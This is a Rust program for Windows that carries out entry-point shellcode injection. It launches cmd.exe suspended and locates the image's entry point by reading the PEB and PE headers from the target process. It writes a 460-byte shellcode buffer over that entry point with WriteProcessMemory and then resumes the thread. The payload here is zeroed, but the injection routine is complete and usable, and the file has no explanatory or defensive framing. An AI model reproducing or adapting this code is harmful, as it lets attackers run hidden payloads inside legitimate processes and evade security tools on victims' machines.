use std::{
    ffi::c_void,
    mem::{size_of, zeroed},
    ptr::{addr_of_mut, null_mut},
};
#[cfg(any(target_arch = "x86", target_arch = "arm"))]
use windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
#[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
use windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
use windows::{
    Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
    Win32::{
        Foundation::{CloseHandle, HANDLE, STATUS_SUCCESS},
        System::{
            Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory},
            SystemServices::IMAGE_DOS_HEADER,
            Threading::{
                CREATE_SUSPENDED, CreateProcessW, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
                ResumeThread, STARTF_USESHOWWINDOW, STARTUPINFOW,
            },
        },
    },
    core::{Result, w},
};

#[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
type ImageNtHeaders = IMAGE_NT_HEADERS64;

#[cfg(any(target_arch = "x86", target_arch = "arm"))]
type ImageNtHeaders = IMAGE_NT_HEADERS32;

#[cfg(any(target_arch = "x86_64", target_arch = "aarch64"))]
const OFFSET_IMAGE_BASE: usize = 0x10;

#[cfg(any(target_arch = "x86", target_arch = "arm"))]
const OFFSET_IMAGE_BASE: usize = 0x08;

struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.is_invalid() {
                let _ = CloseHandle(self.0);
            }
        }
    }
}

fn main() -> Result<()> {
    let shellcode: [u8; 460] = [0x00; 460];

    let s_info = STARTUPINFOW {
        cb: size_of::<STARTUPINFOW>() as u32,
        dwFlags: STARTF_USESHOWWINDOW,
        ..Default::default()
    };

    let mut p_info = PROCESS_INFORMATION::default();

    unsafe {
        CreateProcessW(
            w!("C:\\Windows\\System32\\cmd.exe"),
            None,
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            w!("C:\\Windows\\System32"),
            &s_info,
            &mut p_info,
        )?
    };

    let _h_process_guard = HandleGuard(p_info.hProcess);
    let _h_thread_guard = HandleGuard(p_info.hThread);

    let mut pb_info = PROCESS_BASIC_INFORMATION::default();
    let mut return_length = 0u32;

    let nt_query = unsafe {
        NtQueryInformationProcess(
            p_info.hProcess,
            ProcessBasicInformation,
            addr_of_mut!(pb_info).cast(),
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        )
    };

    if nt_query != STATUS_SUCCESS {
        return Ok(());
    }

    let lp_base_address = (pb_info.PebBaseAddress as usize + OFFSET_IMAGE_BASE) as *const c_void;

    let mut base_address: *mut c_void = null_mut();
    let mut bytes_read = 0usize;

    unsafe {
        ReadProcessMemory(
            p_info.hProcess,
            lp_base_address,
            addr_of_mut!(base_address).cast(),
            size_of::<usize>(),
            Some(&mut bytes_read),
        )?
    };

    if bytes_read != size_of::<usize>() {
        return Ok(());
    }

    let mut dos_header: IMAGE_DOS_HEADER = unsafe { zeroed() };

    unsafe {
        ReadProcessMemory(
            p_info.hProcess,
            base_address,
            addr_of_mut!(dos_header).cast(),
            size_of::<IMAGE_DOS_HEADER>(),
            Some(&mut bytes_read),
        )?
    };

    if bytes_read != size_of::<IMAGE_DOS_HEADER>() {
        return Ok(());
    }

    if dos_header.e_lfanew == 0 {
        return Ok(());
    }

    let lp_nt_header = (base_address as usize + dos_header.e_lfanew as usize) as *const c_void;

    let mut nt_headers: ImageNtHeaders = unsafe { zeroed() };

    unsafe {
        ReadProcessMemory(
            p_info.hProcess,
            lp_nt_header,
            addr_of_mut!(nt_headers).cast(),
            size_of::<ImageNtHeaders>(),
            Some(&mut bytes_read),
        )?
    };

    if bytes_read != size_of::<ImageNtHeaders>() {
        return Ok(());
    }

    let entry_point = (base_address as usize
        + nt_headers.OptionalHeader.AddressOfEntryPoint as usize)
        as *mut c_void;

    let mut bytes_written = 0usize;

    unsafe {
        WriteProcessMemory(
            p_info.hProcess,
            entry_point,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            Some(&mut bytes_written),
        )?
    };

    if unsafe { ResumeThread(p_info.hThread) } == u32::MAX {
        return Ok(());
    }

    Ok(())
}
